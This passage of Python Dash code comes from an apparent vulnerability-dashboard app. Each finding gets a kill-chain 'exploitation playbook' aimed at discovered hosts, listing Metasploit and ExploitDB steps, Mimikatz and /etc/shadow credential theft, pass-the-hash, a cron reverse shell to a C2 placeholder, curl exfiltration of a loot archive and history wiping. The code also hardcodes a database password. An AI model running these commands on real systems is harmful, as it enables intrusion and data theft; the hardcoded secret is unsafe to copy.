                        html.Span(f"{icon} ", style={"fontSize": "12px"}),
                        html.Span(mod["type"].upper(), style={
                            "color": clr, "fontWeight": "800", "fontSize": "10px",
                            "background": f"{clr}15", "padding": "1px 6px",
                            "borderRadius": "4px", "border": f"1px solid {clr}33",
                        }),
                        html.Span(f"  {mod['path']}", style={
                            "color": "#e0e0e0", "fontSize": "10px", "fontFamily": "monospace",
                            "marginLeft": "6px",
                        }),
                    ], style={"marginBottom": "2px"}),
                    html.Div(mod["desc"], style={
                        "color": "#8e9eb0", "fontSize": "9px", "fontStyle": "italic",
                        "marginLeft": "20px", "marginBottom": "2px",
                    }),
                    _cmd(f"use {mod['path']}", clr),
                    _cmd(f"set RHOSTS {target_ip}; set LHOST <attacker_ip>; run", clr),
                ], style={"marginBottom": "8px", "paddingLeft": "4px",
                          "borderLeft": f"2px solid {clr}44"})

            def _msf_section(mods_of_types, target_ip, step_label):
                """Render a Metasploit Arsenal section for given types."""
                matched = [m for m in cve_mods if m["type"] in mods_of_types]
                if not matched:
                    return html.Div()
                return html.Div([
                    html.Div([
                        html.Span(f"{step_label} ", style={"color": ACCENT, "fontWeight": "800"}),
                        html.Span("🧰 Metasploit Arsenal", style={
                            "color": "#ff4444", "fontWeight": "700", "fontSize": "11px"}),
                        html.Span(f"  — {len(matched)} module{'s' if len(matched)!=1 else ''} found",
                                  style={"color": "#555", "fontSize": "10px", "marginLeft": "6px"}),
                    ], style={"marginBottom": "6px"}),
                    html.Div([
                        html.Div("📋 What executives need to know:", style={
                            "color": "#ffd700", "fontSize": "9px", "fontWeight": "700",
                            "marginBottom": "4px"}),
                        html.Div("These are pre-built attack tools from the Metasploit Framework — "
                                 "the industry-standard penetration testing platform. Each module "
                                 "automates a specific attack technique, meaning an attacker with "
                                 "basic skills can exploit these vulnerabilities.", style={
                            "color": "#8e9eb0", "fontSize": "9px",
                            "marginBottom": "8px", "lineHeight": "1.4",
                        }),
                    ]),
                ] + [_msf_card(m, target_ip) for m in matched[:8]],
                style={"marginBottom": "6px",
                       "background": "#0a0e1466", "padding": "8px",
                       "borderRadius": "6px", "border": "1px solid #ff444422"})

            def _cmd(text, color="#00ff88"):
                return html.Code(text, style={
                    "color": color, "fontSize": "10px", "background": "#0a0e14",
                    "padding": "4px 8px", "borderRadius": "4px", "display": "block",
                    "marginTop": "2px", "fontFamily": "monospace",
                })

            def _ttp(tid, name):
                return html.Span([
                    html.A(tid, href=f"https://attack.mitre.org/techniques/{tid.replace('.', '/')}/",
                           target="_blank", style={
                               "color": "#ff8c00", "fontSize": "9px", "textDecoration": "none",
                               "fontFamily": "monospace", "fontWeight": "700",
                           }),
                    html.Span(f" {name}", style={
                        "color": "#8e9eb0", "fontSize": "9px", "marginLeft": "2px"}),
                ], style={"display": "inline-block", "marginRight": "8px",
                          "background": "#ff8c0010", "padding": "1px 5px",
                          "borderRadius": "4px", "border": "1px solid #ff8c0022"})

            def _phase_header(icon, title, tactic_id, tactic_name, color):
                return html.Div([
                    html.Span(f"{icon} {title}", style={
                        "fontWeight": "800", "color": color, "fontSize": "12px"}),
                    html.A(f"  {tactic_id} — {tactic_name}",
                           href=f"https://attack.mitre.org/tactics/{tactic_id}/",
                           target="_blank", style={
                               "color": "#555", "fontSize": "9px", "textDecoration": "none",
                               "marginLeft": "6px"}),
                ], style={"borderBottom": f"1px solid {color}33",
                          "paddingBottom": "4px", "marginBottom": "6px"})

            # ── Phase 1: Initial Access / Foothold (TA0001) ──────
            phase1_steps = [
                _phase_header("🎯", "INITIAL ACCESS — Foothold", "TA0001", "Initial Access", "#ff4444"),
                html.Div([_ttp("T1190", "Exploit Public-Facing App"),
                          _ttp("T1133", "External Remote Services"),
                          _ttp("T1059", "Command & Scripting")],
                         style={"marginBottom": "6px"}),
                # Recon
                html.Div([
                    html.Span("1. ", style={"color": ACCENT, "fontWeight": "800"}),
                    html.Span("Reconnaissance & Enumeration", style={
                        "color": "#e0e0e0", "fontWeight": "700", "fontSize": "11px"}),
                    _cmd(f"nmap -sV -sC -O --script vuln,vulners -p- {tgt}"),
                    _cmd(f"nmap -sU --top-ports 100 {tgt}"),
                ], style={"marginBottom": "6px"}),
            ]
            # Exploit search
            if cve_id:
                phase1_steps.append(html.Div([
                    html.Span("2. ", style={"color": ACCENT, "fontWeight": "800"}),
                    html.Span("Exploit Search", style={
                        "color": "#e0e0e0", "fontWeight": "700", "fontSize": "11px"}),
                    _cmd(f"searchsploit {cve_id}", "#ff8c00"),
                    _cmd(f"searchsploit --nmap scan_results.xml", "#ff8c00"),
                ], style={"marginBottom": "6px"}))

            # Exploitation
            if has_msf:
                phase1_steps.append(html.Div([
                    html.Span("3. ", style={"color": ACCENT, "fontWeight": "800"}),
                    html.Span("Exploit via Metasploit", style={
                        "color": "#e0e0e0", "fontWeight": "700", "fontSize": "11px"}),
                    _cmd(f"msfconsole -q -x 'search {cve_id}'", "#ff4444"),
                    _cmd(f"use <module>; set RHOSTS {tgt}; set LHOST <attacker_ip>", "#ff4444"),
                    _cmd(f"set PAYLOAD <payload>; run", "#ff4444"),
                ], style={"marginBottom": "6px"}))
            elif has_edb:
                phase1_steps.append(html.Div([
                    html.Span("3. ", style={"color": ACCENT, "fontWeight": "800"}),
                    html.Span("Exploit via ExploitDB", style={
                        "color": "#e0e0e0", "fontWeight": "700", "fontSize": "11px"}),
                    _cmd(f"searchsploit -m {cve_id}", "#ff8c00"),
                    _cmd(f"# Review code, set target → {tgt}, compile if needed", "#888"),
                    _cmd(f"python3 exploit.py {tgt}", "#ff8c00"),
                ], style={"marginBottom": "6px"}))
            else:
                phase1_steps.append(html.Div([
                    html.Span("3. ", style={"color": ACCENT, "fontWeight": "800"}),
                    html.Span("Manual Exploitation", style={
                        "color": "#e0e0e0", "fontWeight": "700", "fontSize": "11px"}),
                    _cmd(f"# Craft payload based on vulnerability type", "#888"),
                    _cmd(f"curl -v https://{tgt}/ | grep -i version", "#ff8c00"),
                ], style={"marginBottom": "6px"}))

            # Verify foothold
            phase1_steps.append(html.Div([
                html.Span("4. ", style={"color": ACCENT, "fontWeight": "800"}),
                html.Span("Verify Foothold", style={
                    "color": "#e0e0e0", "fontWeight": "700", "fontSize": "11px"}),
                _cmd(f"whoami && id && hostname && ip a"),
                _cmd(f"cat /etc/os-release || systeminfo"),
            ], style={"marginBottom": "6px"}))

            # ADD: Metasploit exploit + auxiliary modules for Initial Access
            phase1_steps.append(_msf_section(
                ["exploit", "auxiliary"], tgt, "5."))

            # ── Phase 2: Privilege Escalation (TA0004) ───────────
            phase2_steps = [
                _phase_header("⬆️", "PRIVILEGE ESCALATION", "TA0004", "Privilege Escalation", "#ff8c00"),
                html.Div([_ttp("T1548", "Abuse Elevation Control"),
                          _ttp("T1068", "Exploitation for Priv Esc"),
                          _ttp("T1055", "Process Injection"),
                          _ttp("T1053", "Scheduled Task/Job")],
                         style={"marginBottom": "6px"}),
                html.Div([
                    html.Span("1. ", style={"color": ACCENT, "fontWeight": "800"}),
                    html.Span("Automated Enumeration", style={
                        "color": "#e0e0e0", "fontWeight": "700", "fontSize": "11px"}),
                    _cmd(f"# Linux", "#888"),
                    _cmd(f"curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"),
                    _cmd(f"# Windows", "#888"),
                    _cmd(f"iex(iwr https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1 -UseBasicParsing)", "#00d4ff"),
                ], style={"marginBottom": "6px"}),
                html.Div([
                    html.Span("2. ", style={"color": ACCENT, "fontWeight": "800"}),
                    html.Span("SUID/Capabilities (Linux)", style={
                        "color": "#e0e0e0", "fontWeight": "700", "fontSize": "11px"}),
                    _cmd(f"find / -perm -4000 -type f 2>/dev/null"),
                    _cmd(f"getcap -r / 2>/dev/null"),
                    _cmd(f"sudo -l  # Check sudo misconfigs"),
                ], style={"marginBottom": "6px"}),
                html.Div([
                    html.Span("3. ", style={"color": ACCENT, "fontWeight": "800"}),
                    html.Span("Token/UAC (Windows)", style={
                        "color": "#e0e0e0", "fontWeight": "700", "fontSize": "11px"}),
                    _cmd(f"whoami /priv  # Check SeImpersonate, SeDebug", "#00d4ff"),
                    _cmd(f"# Potato family: JuicyPotato, PrintSpoofer, GodPotato", "#888"),
                    _cmd(f".\\PrintSpoofer.exe -c 'cmd /c whoami'", "#00d4ff"),
                ], style={"marginBottom": "6px"}),
                html.Div([
                    html.Span("4. ", style={"color": ACCENT, "fontWeight": "800"}),
                    html.Span("Kernel Exploits", style={
                        "color": "#e0e0e0", "fontWeight": "700", "fontSize": "11px"}),
                    _cmd(f"uname -a  # Linux — check kernel version"),
                    _cmd(f"searchsploit linux kernel $(uname -r | cut -d'-' -f1)", "#ff8c00"),
                ], style={"marginBottom": "6px"}),
            ]

            # ADD: Metasploit post modules for Privilege Escalation
            phase2_steps.append(_msf_section(
                ["post", "encoder", "evasion"], tgt, "5."))

            # ── Phase 3: Lateral Movement (TA0008) ───────────────
            phase3_steps = [
                _phase_header("↔️", "LATERAL MOVEMENT", "TA0008", "Lateral Movement", "#00d4ff"),
                html.Div([_ttp("T1021", "Remote Services"),
                          _ttp("T1021.002", "SMB/Admin Shares"),
                          _ttp("T1550.002", "Pass the Hash"),
                          _ttp("T1563", "Remote Service Hijacking")],
                         style={"marginBottom": "6px"}),
                html.Div([
                    html.Span("1. ", style={"color": ACCENT, "fontWeight": "800"}),
                    html.Span("Credential Harvesting", style={
                        "color": "#e0e0e0", "fontWeight": "700", "fontSize": "11px"}),
                    _cmd(f"# Linux", "#888"),
                    _cmd(f"cat /etc/shadow; cat ~/.ssh/id_rsa; grep -ri password /etc/"),
                    _cmd(f"# Windows (Mimikatz)", "#888"),
                    _cmd(f"mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit", "#00d4ff"),
                ], style={"marginBottom": "6px"}),
                html.Div([
                    html.Span("2. ", style={"color": ACCENT, "fontWeight": "800"}),
                    html.Span("Pass-the-Hash / Pass-the-Ticket", style={
                        "color": "#e0e0e0", "fontWeight": "700", "fontSize": "11px"}),
                    _cmd(f"crackmapexec smb {tgt}/24 -u admin -H <NTLM_HASH>", "#ff8c00"),
                    _cmd(f"impacket-psexec -hashes :<NTLM> admin@<next_target>", "#ff8c00"),
                ], style={"marginBottom": "6px"}),
                html.Div([
                    html.Span("3. ", style={"color": ACCENT, "fontWeight": "800"}),
                    html.Span("SSH Pivoting", style={
                        "color": "#e0e0e0", "fontWeight": "700", "fontSize": "11px"}),
                    _cmd(f"ssh -D 9050 user@{tgt}  # SOCKS proxy"),
                    _cmd(f"proxychains nmap -sT -Pn <internal_target>", "#ff8c00"),
                ], style={"marginBottom": "6px"}),
            ]
            # Add other hosts as targets
            if len(f_hosts) > 1:
                other_targets = ", ".join(f_hosts[1:4])
                phase3_steps.append(html.Div([
                    html.Span("4. ", style={"color": ACCENT, "fontWeight": "800"}),
                    html.Span("Pivot to Other Affected Hosts", style={
                        "color": "#e0e0e0", "fontWeight": "700", "fontSize": "11px"}),
                    _cmd(f"# Other affected hosts: {other_targets}"),
                    _cmd(f"crackmapexec smb {' '.join(f_hosts[1:4])} -u user -p pass", "#ff8c00"),
                ], style={"marginBottom": "6px"}))

            # ADD: Metasploit auxiliary modules for Lateral Movement
            phase3_steps.append(_msf_section(
                ["auxiliary"], tgt, "5." if len(f_hosts) <= 1 else "6."))

            # ── Phase 4: Post-Exploitation (TA0009/TA0010/TA0011)
            phase4_steps = [
                _phase_header("🏴", "POST-EXPLOITATION", "TA0009", "Collection / Exfil / C2", "#9c27b0"),
                html.Div([_ttp("T1005", "Data from Local System"),
                          _ttp("T1041", "Exfil Over C2 Channel"),
                          _ttp("T1136", "Create Account"),
                          _ttp("T1053.005", "Cron/Scheduled Task")],
                         style={"marginBottom": "6px"}),
                html.Div([
                    html.Span("1. ", style={"color": ACCENT, "fontWeight": "800"}),
                    html.Span("Persistence (T1053/T1136)", style={
                        "color": "#e0e0e0", "fontWeight": "700", "fontSize": "11px"}),
                    _cmd(f"# Linux: cron backdoor", "#888"),
                    _cmd(f"echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/<C2>/443 0>&1\"' | crontab -"),
                    _cmd(f"# Windows: scheduled task", "#888"),
                    _cmd(f"schtasks /create /tn Updater /tr C:\\evil.exe /sc minute /mo 5", "#00d4ff"),
                ], style={"marginBottom": "6px"}),
                html.Div([
                    html.Span("2. ", style={"color": ACCENT, "fontWeight": "800"}),
                    html.Span("Data Collection (T1005)", style={
                        "color": "#e0e0e0", "fontWeight": "700", "fontSize": "11px"}),
                    _cmd(f"find / -name '*.conf' -o -name '*.db' -o -name '*.sql' 2>/dev/null"),
                    _cmd(f"cat /etc/passwd; cat /etc/shadow"),
                    _cmd(f"# Windows: dump SAM/SYSTEM", "#888"),
                    _cmd(f"reg save HKLM\\SAM sam.bak && reg save HKLM\\SYSTEM sys.bak", "#00d4ff"),
                ], style={"marginBottom": "6px"}),
                html.Div([
                    html.Span("3. ", style={"color": ACCENT, "fontWeight": "800"}),
                    html.Span("Exfiltration (T1041)", style={
                        "color": "#e0e0e0", "fontWeight": "700", "fontSize": "11px"}),
                    _cmd(f"tar czf /tmp/loot.tar.gz /etc/ /home/"),
                    _cmd(f"curl -X POST -F 'file=@/tmp/loot.tar.gz' http://<C2>:8080/upload"),
                ], style={"marginBottom": "6px"}),
                html.Div([
                    html.Span("4. ", style={"color": ACCENT, "fontWeight": "800"}),
                    html.Span("Cleanup & Reporting", style={
                        "color": "#e0e0e0", "fontWeight": "700", "fontSize": "11px"}),
                    _cmd(f"# Remove artifacts, restore configs, document all actions", "#888"),
                    _cmd(f"history -c; rm -rf /tmp/loot*; unset HISTFILE"),
                ], style={"marginBottom": "6px"}),
            ]

            # ADD: Metasploit post modules for Post-Exploitation
            phase4_steps.append(_msf_section(
                ["post", "payload", "nop"], tgt, "5."))

            def _phase_panel(steps, border_color):
                return html.Div(steps, style={
                    "background": "#080c12", "padding": "10px",
                    "borderRadius": "6px", "border": f"1px solid {border_color}22",
                    "marginBottom": "8px",
                })

            exploit_guide = html.Details([
                html.Summary([
                    html.Span("⚔️ MITRE ATT&CK Kill Chain — Exploitation Playbook", style={
                        "fontSize": "11px", "fontWeight": "700", "color": "#ff4444",
                    }),
                ], style={"cursor": "pointer", "padding": "4px 0", "marginTop": "6px"}),
                html.Div([
                    html.Div([
                        html.Span(f"🎯 Target: {host_list}", style={
                            "color": "#00d4ff", "fontSize": "10px", "fontFamily": "monospace",
                            "fontWeight": "600"}),
                        html.Span(f"  ·  {cve_id}" if cve_id else "", style={
                            "color": "#ff8c00", "fontSize": "10px", "marginLeft": "8px"}),
                        html.Span(f"  ·  CVSS {cvss_v}" if cvss_v else "", style={
                            "color": color, "fontSize": "10px", "marginLeft": "8px"}),
                    ], style={"marginBottom": "10px"}),
                    _phase_panel(phase1_steps, "#ff4444"),
                    _phase_panel(phase2_steps, "#ff8c00"),
                    _phase_panel(phase3_steps, "#00d4ff"),
                    _phase_panel(phase4_steps, "#9c27b0"),
                ], style={"marginTop": "6px"}),
            ])

            finding_cards.append(html.Div([
                # Header: name + CVE + badges
                html.Div([
                    html.Div([
                        html.Span(fname[:80], style={
                            "fontWeight": "700", "color": "#e0e0e0", "fontSize": "12px"}),
                        html.A(f"  {cve_id}" if cve_id else "", style={
                            "color": ACCENT, "fontSize": "11px", "marginLeft": "8px",
                            "textDecoration": "none"},
                            href=f"https://nvd.nist.gov/vuln/detail/{cve_id}" if cve_id else "#",
                            target="_blank") if cve_id else html.Span(),
                    ]),
                    html.Div(badge_spans, style={
                        "display": "flex", "gap": "3px", "flexWrap": "wrap"}),
                ], style={"display": "flex", "justifyContent": "space-between",
                          "alignItems": "center", "flexWrap": "wrap"}),
                # Metrics row
                html.Div(metrics, style={
                    "display": "flex", "gap": "12px", "marginTop": "4px"}),
                # Hosts
                html.Div([
                    html.Span("🖥 Hosts: ", style={"fontWeight": "600", "color": "#8e9eb0",
                                                     "fontSize": "10px"}),
                    html.Span(", ".join(f_hosts[:6]) + (f" +{len(f_hosts)-6}" if len(f_hosts)>6 else ""),
                        style={"color": "#aaa", "fontSize": "10px"}),
                ], style={"marginTop": "4px"}),
                # Description
                html.Div(desc, style={
                    "color": "#555", "fontSize": "10px", "marginTop": "4px",
                    "fontStyle": "italic",
                }) if desc else html.Div(),
                # Exploitation Guide
                exploit_guide,
            ], style={
                "background": "#0f1218", "borderRadius": "8px", "padding": "10px",
                "marginBottom": "6px", "border": f"1px solid {color}22",
            }))

        # Section header with severity
        sections.append(html.Div([
            # Severity header
            html.Div([
                html.Span(f"▸ {sev}", style={
                    "fontWeight": "800", "color": color, "fontSize": "14px"}),
                html.Span(f"  {len(items)} findings · {len(hosts)} host{'s' if len(hosts)!=1 else ''}",
                    style={"color": "#555", "fontSize": "11px", "marginLeft": "10px"}),
            ], style={"marginBottom": "8px", "padding": "6px 0",
                      "borderBottom": f"1px solid {color}33"}),

            # Hosts bar
            html.Div([
                html.Span("Affected Hosts: ", style={
                    "fontWeight": "700", "color": "#8e9eb0", "fontSize": "10px"}),
                html.Span(", ".join(hosts[:10]) + (f" +{len(hosts)-10}" if len(hosts)>10 else ""),
                    style={"color": "#ccc", "fontSize": "10px"}),
            ], style={"background": "#161b22", "padding": "6px 10px",
                      "borderRadius": "6px", "marginBottom": "8px"}),

            # Threat Impact
            html.Div([
                html.Span("⚡ Threat Landscape: ", style={
                    "fontWeight": "700", "color": color, "fontSize": "10px"}),
                html.Span(THREAT_IMPACT.get(sev, ""), style={
                    "color": "#aaa", "fontSize": "10px"}),
            ], style={"marginBottom": "4px"}),

            # Mitigation
            html.Div([
                html.Span("🛡️ Mitigation: ", style={
                    "fontWeight": "700", "color": GREEN, "fontSize": "10px"}),
                html.Span(MITIGATIONS.get(sev, ""), style={
                    "color": "#aaa", "fontSize": "10px"}),
            ], style={"marginBottom": "10px"}),

            # Finding cards
            *finding_cards,
        ], style={"marginBottom": "16px"}))

    total_count = sum(len(v) for v in categorized.values())
    summary_bar = html.Div([
        html.Span(f"📋 {total_count} findings", style={
            "fontWeight": "700", "fontSize": "13px", "color": "#e0e0e0"}),
        html.Div([
            html.Span(f"●  {sev} {len(categorized[sev])}", style={
                "color": SEV_COLORS_MAP[sev], "fontSize": "11px", "fontWeight": "600",
            }) for sev in SEV_ORDER if categorized[sev]
        ], style={"display": "flex", "gap": "16px", "marginTop": "4px"}),
    ], style={"background": "#161b22", "padding": "10px 14px",
              "borderRadius": "8px", "marginBottom": "14px"})

    return True, title, html.Div([summary_bar] + sections)


# ======================================================================
# CALLBACK: Hosts Bar → All Hosts Table
# ======================================================================

@callback(
    Output("grc-hosts-modal", "is_open"),
    Output("grc-hosts-body", "children"),
    Input("grc-hosts-bar", "n_clicks"),
    prevent_initial_call=True,
)
def _show_hosts_table(n_clicks):
    """Show all hosts in a table when the Attack Surface bar is clicked."""
    import os as _os_h
    from neo4j import GraphDatabase

    if not n_clicks:
        return False, html.Div()

    try:
        _pw = _os_h.environ.get("NEO4J_PASSWORD", "Adomaa12@")
        _drv = GraphDatabase.driver("bolt://127.0.0.1:7687", auth=("neo4j", _pw))
        with _drv.session() as s:
            rows = s.run("""
                MATCH (h:Host)
                OPTIONAL MATCH (h)-[:RUNS_SERVICE|EXPOSES|HasService]->(svc:Service)
                OPTIONAL MATCH (svc)-[:HAS_FINDING|HAS_VULN]->(f:Finding)
                WITH h,
                     coalesce(h.ip, h.host, 'unknown') AS host_ip,
                     coalesce(h.hostname, h.host, '') AS hostname,
                     count(DISTINCT svc) AS svc_count,
                     count(DISTINCT f) AS finding_count,
                     collect(DISTINCT f.cve) AS cves,
                     collect(DISTINCT coalesce(toString(f.severity), '')) AS sevs,
                     collect(DISTINCT coalesce(f.cvss, 0)) AS cvss_list
                RETURN host_ip, hostname, svc_count, finding_count, cves, sevs,
                       cvss_list
                ORDER BY finding_count DESC
            """).data()
        _drv.close()
    except Exception:
        import traceback
        traceback.print_exc()
        return True, html.Div("Error loading host data.",
                              style={"color": RED, "padding": "20px"})

    if not rows:
        return True, html.Div("No hosts found in Neo4j.",
                              style={"color": "#555", "padding": "20px"})

    # Build table rows
    table_rows = []
    for i, r in enumerate(rows):
        ip = r["host_ip"]
        name = r["hostname"]
        svcs = r["svc_count"]
        findings = r["finding_count"]
        cves = [c for c in (r["cves"] or []) if c and str(c).startswith("CVE-")]
        sevs = [s.lower() for s in (r["sevs"] or []) if s]
        cvss_vals = [float(c) for c in (r["cvss_list"] or []) if c and float(c) > 0]

        # Count severities from CVSS
        crit = sum(1 for c in cvss_vals if c >= 9.0)
        high = sum(1 for c in cvss_vals if 7.0 <= c < 9.0)
        med = sum(1 for c in cvss_vals if 4.0 <= c < 7.0)
        low = sum(1 for c in cvss_vals if 0.1 <= c < 4.0)

        # Risk color
        if crit > 0:
            risk_color = RED
            risk_label = "Critical"
        elif high > 0:
            risk_color = ORANGE
            risk_label = "High"
        elif med > 0:
            risk_color = YELLOW
            risk_label = "Medium"
        elif low > 0:
            risk_color = GREEN
            risk_label = "Low"
        else:
            risk_color = "#8e9eb0"
            risk_label = "Info"

        bg = "#0f1218" if i % 2 == 0 else "#131825"
        top_cves = cves[:3]

        table_rows.append(html.Tr([
            html.Td(html.Span(ip, style={
                "color": ACCENT, "fontWeight": "700", "fontFamily": "monospace",
                "fontSize": "12px",
            })),
            html.Td(name or "—", style={"color": "#aaa", "fontSize": "11px"}),
            html.Td(str(svcs), style={"color": "#00d4ff", "fontWeight": "600",
                                       "textAlign": "center"}),
            html.Td(str(findings), style={"color": "#e0e0e0", "fontWeight": "700",
                                           "textAlign": "center"}),
            html.Td(html.Div([
                html.Span(f"C:{crit}", style={"color": RED, "fontSize": "10px",
                                                "marginRight": "4px"}) if crit else "",
                html.Span(f"H:{high}", style={"color": ORANGE, "fontSize": "10px",
                                                "marginRight": "4px"}) if high else "",
                html.Span(f"M:{med}", style={"color": YELLOW, "fontSize": "10px",
                                               "marginRight": "4px"}) if med else "",
                html.Span(f"L:{low}", style={"color": GREEN, "fontSize": "10px"}) if low else "",
            ])),
            html.Td(html.Span(risk_label, style={
                "color": risk_color, "fontSize": "10px", "fontWeight": "700",
                "background": f"{risk_color}15", "padding": "2px 8px",
                "borderRadius": "8px", "border": f"1px solid {risk_color}33",
            })),
            html.Td(html.Div([
                html.Span(c, style={"color": "#00d4ff", "fontSize": "9px",
                                     "marginRight": "4px"})
                for c in top_cves
            ] + ([html.Span(f"+{len(cves)-3}", style={
                "color": "#555", "fontSize": "9px"})] if len(cves) > 3 else [])
            )),
            html.Td(
                html.Button("View ▸", id={"type": "grc-host-btn", "index": ip},
                            n_clicks=0,
                            style={
                                "background": f"{ACCENT}15", "border": f"1px solid {ACCENT}44",
                                "color": ACCENT, "fontSize": "10px", "padding": "3px 10px",
                                "borderRadius": "6px", "cursor": "pointer",
                                "fontWeight": "700",
                            }),
            ),
        ], style={"backgroundColor": bg, "transition": "background 0.2s"}))

    # Table header
    _TH = lambda t: html.Th(t, style={
        "color": ACCENT, "fontSize": "10px", "fontWeight": "700",
        "textTransform": "uppercase", "letterSpacing": "0.5px",
        "padding": "8px", "borderBottom": f"2px solid {ACCENT}33",
        "background": "#0a0e14",
    })

    summary = html.Div([
        html.Span(f"🖥️ {len(rows)} hosts discovered", style={
            "fontWeight": "700", "fontSize": "14px", "color": "#e0e0e0"}),
        html.Span(f"  ·  {sum(r['svc_count'] for r in rows)} services  ·  "
                   f"{sum(r['finding_count'] for r in rows)} findings",
                   style={"color": "#555", "fontSize": "11px"}),
    ], style={"background": "#161b22", "padding": "10px 14px",
              "borderRadius": "8px", "marginBottom": "12px"})

    table = html.Table([
        html.Thead(html.Tr([
            _TH("Host IP"), _TH("Hostname"), _TH("Services"),
            _TH("Findings"), _TH("Severity"), _TH("Risk"),
            _TH("Top CVEs"), _TH("Details"),
        ])),
        html.Tbody(table_rows),
    ], style={
        "width": "100%", "borderCollapse": "collapse",
        "fontSize": "12px",
    })

    return True, html.Div([summary, table])


# ======================================================================
# CALLBACK: Per-Host Detail (services, findings, vulnerabilities)
# ======================================================================

@callback(
    Output("grc-hostdetail-modal", "is_open"),
    Output("grc-hostdetail-title", "children"),
    Output("grc-hostdetail-body", "children"),
    Input({"type": "grc-host-btn", "index": dash.ALL}, "n_clicks"),
    prevent_initial_call=True,
)
def _show_host_detail(all_clicks):
    """Show services, findings, and vulns for a specific host."""
    import os as _os_hd
    from dash import ctx
    from neo4j import GraphDatabase

    if not any(c for c in all_clicks if c):
        return False, "", html.Div()

    triggered = ctx.triggered_id
    if not triggered or not isinstance(triggered, dict):
        return False, "", html.Div()

    host_ip = triggered.get("index", "")
    if not host_ip:
        return False, "", html.Div()

    try:
        _pw = _os_hd.environ.get("NEO4J_PASSWORD", "Adomaa12@")
        _drv = GraphDatabase.driver("bolt://127.0.0.1:7687", auth=("neo4j", _pw))
        with _drv.session() as s:
            # Services
            services = s.run("""
                MATCH (h:Host)-[:RUNS_SERVICE|EXPOSES|HasService]->(svc:Service)
                WHERE coalesce(h.ip, h.host) = $hip
                RETURN coalesce(toString(svc.port), '') AS port,
                       coalesce(svc.protocol, svc.name, '') AS protocol,
                       coalesce(svc.name, svc.service, '') AS service_name,
                       coalesce(svc.product, '') AS product,
                       coalesce(svc.version, '') AS version
                ORDER BY toInteger(coalesce(svc.port, '0'))
            """, hip=host_ip).data()

            # Findings
            findings = s.run("""
                MATCH (h:Host)-[:RUNS_SERVICE|EXPOSES|HasService]->(:Service)
                      -[:HAS_FINDING|HAS_VULN]->(f:Finding)
                WHERE coalesce(h.ip, h.host) = $hip
                OPTIONAL MATCH (v:Vulnerability {cve: f.cve})
                RETURN f.name AS name,
                       coalesce(f.cve, '') AS cve,
                       coalesce(toString(f.severity), '') AS severity,
                       coalesce(v.cvss, f.cvss) AS cvss,
                       coalesce(toString(f.source), 'unknown') AS source,
                       coalesce(f.description, '') AS description,
                       coalesce(v.exploitable, f.exploitable, false) AS exploitable
                ORDER BY
                  CASE WHEN coalesce(v.cvss, f.cvss) IS NOT NULL
                       THEN -1*toFloat(toString(coalesce(v.cvss, f.cvss)))
                       ELSE 0 END
            """, hip=host_ip).data()

        _drv.close()
    except Exception:
        import traceback
        traceback.print_exc()
        return True, f"🖥️ {host_ip}", html.Div("Error loading data.",
                     style={"color": RED, "padding": "20px"})

    # ── Services Section ────────────────────────────────────────
    svc_rows = []
    for sv in services:
        svc_rows.append(html.Tr([
            html.Td(sv["port"] or "—", style={
                "color": ACCENT, "fontWeight": "700", "fontFamily": "monospace"}),
            html.Td(sv["protocol"], style={"color": "#aaa"}),
            html.Td(sv["service_name"], style={"color": "#e0e0e0", "fontWeight": "600"}),
            html.Td(sv["product"], style={"color": "#8e9eb0"}),
            html.Td(sv["version"], style={"color": GREEN, "fontFamily": "monospace"}),
        ], style={"backgroundColor": "#0f1218"}))

    _TH_S = lambda t: html.Th(t, style={
        "color": "#00d4ff", "fontSize": "10px", "fontWeight": "700",
        "textTransform": "uppercase", "padding": "6px 8px",
        "borderBottom": "1px solid #00d4ff33", "background": "#0a0e14",
    })

    svc_section = html.Div([
        html.Div([
            html.Span("⚙️ Services", style={
                "fontWeight": "800", "fontSize": "14px", "color": "#00d4ff"}),
            html.Span(f"  {len(services)} discovered", style={
                "color": "#555", "fontSize": "11px", "marginLeft": "8px"}),
        ], style={"marginBottom": "8px", "borderBottom": "1px solid #00d4ff33",
                  "paddingBottom": "6px"}),
        html.Table([
            html.Thead(html.Tr([
                _TH_S("Port"), _TH_S("Protocol"), _TH_S("Service"),
                _TH_S("Product"), _TH_S("Version"),
            ])),
            html.Tbody(svc_rows),
        ], style={"width": "100%", "borderCollapse": "collapse",
                  "fontSize": "12px"}) if svc_rows else html.Div(
            "No services found.", style={"color": "#555", "padding": "12px"}),
    ], style={"marginBottom": "20px"})

    # ── Findings & Vulnerabilities Section ──────────────────────
    SEV_ORDER = ["Critical", "High", "Medium", "Low", "Info"]
    SEV_CLR = {"Critical": RED, "High": ORANGE, "Medium": YELLOW,
               "Low": GREEN, "Info": "#8e9eb0"}
    categorized = {s: [] for s in SEV_ORDER}

    for f in findings:
        cvss = float(f["cvss"]) if f["cvss"] is not None else None
        raw = f["severity"].lower().strip() if f["severity"] else ""
        if cvss is not None:
            sev = ("Critical" if cvss >= 9 else "High" if cvss >= 7 else
                   "Medium" if cvss >= 4 else "Low" if cvss >= 0.1 else "Info")
        elif raw in ("critical", "high", "medium", "low", "info"):
            sev = raw.capitalize()
        else:
            sev = "Info"
        categorized[sev].append(f)

    finding_sections = []
    for sev in SEV_ORDER:
        items = categorized[sev]
        if not items:
            continue
        color = SEV_CLR[sev]

        f_rows = []
        for fi in items:
            cvss_v = fi["cvss"]
            cvss_str = f"{float(cvss_v):.1f}" if cvss_v is not None else "—"
            expl = fi.get("exploitable", False)

            f_rows.append(html.Tr([
                html.Td(html.Span(fi["name"][:60] if fi["name"] else "—", style={
                    "color": "#e0e0e0", "fontWeight": "600", "fontSize": "11px"})),
                html.Td(html.Span(fi["cve"] or "—", style={
                    "color": ACCENT, "fontFamily": "monospace", "fontSize": "10px"})),
                html.Td(cvss_str, style={
                    "color": color, "fontWeight": "700", "textAlign": "center"}),
                html.Td(fi["source"], style={"color": "#8e9eb0", "fontSize": "10px"}),
                html.Td(
                    html.Span("✓ Exploitable", style={
                        "color": RED, "fontSize": "9px", "fontWeight": "600"
                    }) if expl else html.Span("—", style={"color": "#333"}),
                ),
                html.Td(fi["description"][:80] + "…" if len(fi.get("description", "")) > 80
                         else fi.get("description", ""),
                         style={"color": "#555", "fontSize": "10px", "maxWidth": "200px"}),
            ], style={"backgroundColor": "#0f1218"}))

